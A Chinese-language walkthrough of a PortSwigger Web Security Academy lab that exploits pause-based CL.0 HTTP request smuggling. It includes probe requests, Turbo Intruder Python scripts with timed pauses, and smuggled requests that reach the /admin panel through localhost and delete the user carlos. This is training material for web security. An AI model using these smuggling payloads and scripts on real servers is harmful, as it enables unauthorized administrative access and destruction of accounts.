# 实验：服务器端基于暂停的请求走私

本实验容易受到基于暂停的服务器端请求走私攻击。前端服务器将请求流式传输到后端，且后端服务器在某些端点上超时后不会关闭连接。

要解决本实验，请识别一个基于暂停的 CL.0 反同步向量，向后端走私一个请求以访问 `/admin` 下的管理面板，然后删除用户 `carlos`。

> **注意：** 某些服务器端基于暂停的反同步漏洞无法使用 Burp 的核心工具进行利用。您必须使用 [Turbo Intruder](https://portswigger.net/bappstore/9abaa233088242e8be252cd4ff534988) 扩展来解决本实验。

本实验基于 PortSwigger Research 发现的现实世界漏洞。更多详情，请查看 [Browser-Powered Desync Attacks: A New Frontier in HTTP Request Smuggling](https://portswigger.net/research/browser-powered-desync-attacks#pause)。

## 步骤

探测
- 访问账户页面
    ```http
    GET /my-account HTTP/1.1
    Host: id.web-security-academy.net
    ```

    - 响应
        ```http
        HTTP/1.1 302 Found
        Location: /my-account/
        X-Frame-Options: SAMEORIGIN
        Server: Apache/2.4.52
        Keep-Alive: timeout=120
        Content-Length: 0
        ```
        - 服务器超时 120 秒

构建基于暂停的走私探测
- 重复器中设置 CL.0
    ```http
    POST /my-account HTTP/1.1
    Host: id.web-security-academy.net
    Connection: keep-alive
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 34

    GET /hopefully404 HTTP/1.1
    Foo: x
    ```

- 发送到 burp 增强攻击器扩展

    ```py
    def queueRequests(target, wordlists):
        # 单线程
        engine = RequestEngine(endpoint=target.endpoint,
                            concurrentConnections=1,
                            requestsPerConnection=100,
                            pipeline=False,
                            engine=Engine.THREADED
                            )
        
        target_host = 'id.web-security-academy.net'
        # 已知服务器超时 120 秒，从附近范围探测
        init_time = 140000
        step = 10000

        for cur_time in range(init_time, 0, -step):
            # queue 参数：
            ## `pauseMarker` 暂停字符序列的列表
            ## `pauseTime` 暂停的持续时间，以毫秒为单位
            engine.queue(target.req, pauseMarker=['\r\n\r\n'], pauseTime=cur_time)

            # 任意后续请求
            followUp = 'GET / HTTP/1.1\r\nHost: {target_host}\r\n\r\n'.format(target_host=target_host)
            engine.queue(followUp)
        
    # 将所有响应记录到结果表中
    def handleResponse(req, interesting):
        table.add(req)

    ```

- 在结果表查看记录，触点为响应2的走私端点 `/hopefully404` 的 302 开放重定向。确认基于暂停的走私存在

使用基于暂停的 CL.0 走私访问内网端点
- 修改载荷请求1

    ```http
    POST /my-account HTTP/1.1
    Host: id.web-security-academy.net
    Connection: keep-alive
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 34

    GET /admin/ HTTP/1.1
    Host: localhost
    Content-Length: 1


    ```
    - 直接访问管理员端点 `/admin/`，得到响应 401 `Admin interface only available to local users`
        - 添加 localhost 为主机
    - 设置走私请求 CL，以移动后续请求头到走私请求体
        - 由于此处为持续连接，可移除走私请求的 CL，直接作为完整走私请求。之后的普通请求将得到走私请求的响应

- 修改扩展脚本
    ```py
    def queueRequests(target, wordlists):
        engine = RequestEngine(endpoint=target.endpoint,
                            concurrentConnections=1,
                            requestsPerConnection=100,
                            pipeline=False,
                            engine=Engine.THREADED
                            )

        target_host = 'id.web-security-academy.net'
        cur_time = 100000

        engine.queue(target.req, pauseMarker=['\r\n\r\n'], pauseTime=cur_time)

        followUp = 'GET / HTTP/1.1\r\nHost: {target_host}\r\n\r\n'.format(target_host=target_host)
        engine.queue(followUp)
        
    def handleResponse(req, interesting):
        table.add(req)

    ```
    - 设置为有效的 100 秒时长

- 响应200，返回管理员面板

    ```html
    <form style='margin-top: 1em' class='login-form' action='/admin/delete' method='POST'>
        <input required type="hidden" name="csrf" value="4qskVYHKfjRth2nknx8oexOrfp8bEyC2">
        <label>
            Username
        </label>
        <input required type='text' name='username'>
        <button class='button' type='submit'>
            Delete user
        </button>
    </form>
    ```

- 基于得到的表单，构造删除功能端点请求
    ```http
    POST /my-account HTTP/1.1
    Host: id.web-security-academy.net
    Connection: keep-alive
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 127

    POST /admin/delete/ HTTP/1.1
    Host: localhost
    Content-Length: 59

    csrf=4qskVYHKfjRth2nknx8oexOrfp8bEyC2&username=carlos&foo=
    ```
    - 注意，应用程序存在路径格式化的重定向，于是在表单的端点后添加规范化 `/` 为 `/admin/delete/`
    - 注意，此处由于存在双回车换行序列 `\r\n\r\n`，需同时调整脚本的暂停序列
        ```py
        engine.queue(target.req, pauseMarker=['\r\n\r\nPOST'], pauseTime=cur_time)
        ```
        - 仅在走私请求开头暂停，而不会被走私体的双回车换行打断
